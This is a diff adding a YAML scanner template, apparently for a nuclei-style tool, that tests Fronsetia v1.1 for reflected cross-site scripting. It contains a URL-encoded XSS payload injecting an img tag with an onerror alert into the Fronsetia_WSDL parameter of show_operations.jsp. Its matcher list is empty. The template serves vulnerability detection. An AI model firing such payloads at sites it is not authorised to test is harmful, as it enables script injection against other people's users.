@@ -1,0 +1,15 @@
+id: fronsetiav-xss
+brief:
+    title: Fronsetiav1.1 - Cross-Site Scripting
+    by: s4e-io
+    level: high
+    about: The fronsetiav1.1 application is vulnerable to a Reflected XSS attack through the show_operations.jsp endpoint. An attacker can inject malicious scripts via the WSDL Location input, which is execut...
+    label:
+        - xss
+        - fronsetia
+        - vuln
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/show_operations.jsp?Fronsetia_WSDL=%22%3E%3Cimg%2Bsrc%3Dx%20onerror%3Dalert(document.domain)%3E'
+      signs: []
